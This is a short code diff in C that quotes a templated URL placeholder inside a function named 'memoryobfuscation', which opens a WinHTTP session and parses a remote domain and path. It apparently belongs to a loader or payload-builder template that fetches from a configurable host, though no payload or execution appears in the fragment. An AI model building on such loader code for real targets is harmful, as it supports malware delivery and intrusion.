@@ -165,7 +165,7 @@ void memoryobfuscation(){
     HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
     if (!hSession) return;
     
-    const char* url = {{URL_SIDECAR}}
+    const char* url = "{{URL_SIDECAR}}";
 
     char domain[256] = {0};
     char path[1024] = {0};
